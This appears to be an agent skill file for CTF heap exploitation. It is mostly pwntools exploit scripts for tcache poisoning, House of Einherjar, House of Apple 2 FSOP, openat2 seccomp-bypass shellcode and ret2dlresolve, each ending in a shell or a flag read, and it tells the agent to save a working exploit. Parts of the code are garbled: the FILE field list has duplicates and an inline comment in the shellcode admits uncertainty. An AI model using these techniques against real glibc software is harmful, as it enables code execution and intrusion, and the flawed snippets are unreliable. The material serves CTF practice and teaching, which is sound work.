---
name: pwn-heap
description: "CTF heap exploitation. House of Apple 2 (FSOP), House of Einherjar, tcache poisoning, seccomp bypass, ret2dlresolve, musl libc attacks, setcontext pivot, tcache stashing unlink. Triggers: 'heap exploitation', 'house of', 'fsop', 'tcache', 'heap pwn', 'heap overflow', 'use after free', 'double free', 'glibc heap', 'house of apple', 'heap grooming'."
---

# CTF Pwn: Heap Exploitation (Advanced)

House of Apple 2, tcache poisoning, FSOP, seccomp bypass, ret2dlresolve.

## Install

```bash
pip install pwntools --break-system-packages
apt-get install -y gdb pwndbg

# glibc source (for heap internals):
apt-get install -y glibc-source
```

---

## Phase 1: Heap Reconnaissance

```bash
BINARY="./challenge"

checksec "$BINARY"
# Key: glibc version determines available attacks
ldd "$BINARY" | grep libc
strings "$BINARY" | grep "GLIBC_" | sort -u

# In GDB (pwndbg):
# heap: show heap chunks
# vis_heap_chunks: visual heap view
# bins: fastbins, tcache, unsorted/small/large bins
# malloc_chunk addr: parse chunk at address
```

---

## Phase 2: Tcache Poisoning (glibc 2.32+)

```python
from pwn import *

# Safe-linking bypass (2.32+): fd ^ (chunk_addr >> 12)
def safe_link_encrypt(pos, ptr):
    return (pos >> 12) ^ ptr

def safe_link_decrypt(leak, pos):
    key = leak >> 12
    result = leak ^ key
    for i in range(2, 64):
        key = result >> (64 - i)
        result = leak ^ key
    return result & 0xffffffffffffffff

# Double free → tcache contains 2 ptrs to same chunk
# Allocate chunk A, free A, free A again (need confusion trick for mitigations)
# Modify freed chunk's fd pointer (with safe-link encoding)
# Next two malloc() return same chunk (control fd) then target addr

TARGET = 0x4040c0  # address to write to (e.g., __free_hook, GOT)
SYSTEM = 0x7f1234  # system() address

p = process('./challenge')
heap_leak = 0xdeadbeef  # from earlier leak

# After double-free:
encoded_target = safe_link_encrypt(heap_leak, TARGET)
p.sendafter("data:", p64(encoded_target))  # write encoded pointer

# Next 2 allocations:
# malloc 1 → same chunk again (dummy)
# malloc 2 → TARGET address
# Write payload to allocated memory at TARGET
p.sendafter("data:", p64(SYSTEM))  # write system() to __free_hook/GOT
p.interactive()
```

---

## Phase 3: House of Einherjar (Off-by-One Null)

```python
from pwn import *

# Off-by-one null byte overflow: set prev_in_use bit of next chunk to 0
# Backward consolidation → merge with controlled fake chunk
# Result: overlapping chunk → use-after-free + arbitrary write

p = process('./challenge')

# 1. Create fake chunk at controlled location:
FAKE_CHUNK_ADDR = 0x602040  # bss or heap location you control
p.sendafter("data:", p64(0) + p64(0x421) + p64(FAKE_CHUNK_ADDR) + p64(FAKE_CHUNK_ADDR))

# 2. Allocate victim chunk just after fake chunk:
p.sendafter("size:", str(0x18).encode())  # small allocation

# 3. Off-by-one overflow: set prev_in_use=0 and prev_size to fake_chunk offset:
OFFSET_TO_FAKE = 0x420  # distance from fake chunk to victim
p.sendafter("data:", b'A' * 0x18 + p64(OFFSET_TO_FAKE))  # off-by-one writes null

# 4. Free victim chunk → triggers backward consolidation with fake chunk:
p.sendafter("action:", b"free")

# 5. Reallocate → overlaps with previously allocated chunks
p.interactive()
```

---

## Phase 4: House of Apple 2 (FSOP, glibc 2.34+)

```python
from pwn import *

# FSOP: corrupt _IO_FILE structure → code execution via fflush/_IO_flush_all_lockp
# Works when: heap addr known, one relative overwrite

# _IO_FILE structure (simplified):
# _flags, _IO_read_ptr, _IO_read_end, _IO_read_base
# _IO_write_base, _IO_write_ptr, _IO_write_end
# _IO_buf_base, _IO_buf_end
# _IO_backup_base, _IO_save_end, _IO_save_base
# _chain (next FILE), _fileno, _flags2, _offset
# _codecvt, _wide_data, _freeres_list, _freeres_buf
# __pad5, _mode, _shortbuf, _lock, _offset
# _codecvt, _wide_data, vtable

# Apple 2 chain: set wjump[3] = (_IO_wfile_overflow)
# → calls _IO_new_file_overflow → calls _IO_OVERFLOW → system("/bin/sh")

def craft_fake_file(system_addr, sh_addr, wide_data_addr, heap_addr):
    fake_file = flat(
        0,              # _flags (no MAGIC to trigger different path)
        0,              # _IO_read_ptr
        0,              # _IO_read_end
        0,              # _IO_read_base
        1,              # _IO_write_base (non-zero)
        system_addr,    # _IO_write_ptr (system(): called as wjump[3])
        0,
        sh_addr,        # _IO_buf_base ("/bin/sh")
        0,
        p64(0) * 5,
        p64(wide_data_addr),  # _wide_data
        p64(0) * 2,
        p64(heap_addr + 0x100),  # vtable → _IO_wfile_jumps - 0x18
    )
    return fake_file

# After crafting: trigger exit() or fflush(NULL) → FSOP chain fires
```

---

## Phase 5: Seccomp Bypass

```bash
# Detect seccomp filters:
seccomp-tools dump ./challenge
# OR:
strace -e seccomp ./challenge 2>&1 | head -20

# Common restrictions:
# - openat blocked → use openat2 (syscall 437)
# - execve blocked → use execveat (syscall 322)
# - read blocked → use readv or preadv
# - write blocked → use writev
```

```python
# Seccomp bypass via openat2 (Linux 5.6+):
from pwn import *

p = process('./challenge')

# openat2 struct:
# struct open_how { uint64_t flags, mode, resolve; }
OPEN_HOW_SIZE = 24
shellcode = asm('''
    /* openat2("/flag", O_RDONLY, &how, sizeof(how)) */
    lea rdi, [rip + flag_path]
    xor esi, esi               /* O_RDONLY */
    lea rdx, [rip + how]
    mov ecx, 24                /* sizeof(how) */
    mov eax, 437               /* SYS_openat2 */
    xor r10d, r10d             /* AT_FDCWD? Actually use dfd=-100 */
    syscall
    
    /* read(fd, buf, 100) */
    mov rdi, rax
    lea rsi, [rip + buf]
    mov edx, 100
    xor eax, eax               /* SYS_read */
    syscall
    
    /* write(1, buf, rax) */
    mov edx, eax
    lea rsi, [rip + buf]
    mov edi, 1
    mov eax, 1
    syscall
    
flag_path: .ascii "/flag\\0"
how: .quad 0, 0, 0             /* flags=O_RDONLY, mode=0, resolve=0 */
buf: .space 100
''', arch='amd64')
```

---

## Phase 6: ret2dlresolve (No Leaks)

```python
from pwn import *

elf = ELF('./challenge')
libc = ELF('./libc.so.6')

# ret2dlresolve: forge .plt/.got structures to resolve symbol to system()
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop.read(0, dlresolve.data_addr, len(dlresolve.payload))
rop.ret2dlresolve(dlresolve)

OFFSET = 120
p = process('./challenge')
p.sendlineafter("Input:", fit({OFFSET: rop.chain()}))
p.sendline(dlresolve.payload)
p.interactive()
```

---

## Output

Save to `.omop/engagement/ctf/pwn/`:
- `exploit.py`: working heap exploit
- `flag.txt`: captured flag

## Next Phase

→ `ctf-pwn-format-string` for format string → heap chain
→ `ctf-pwn-rop` for ROP chain after heap
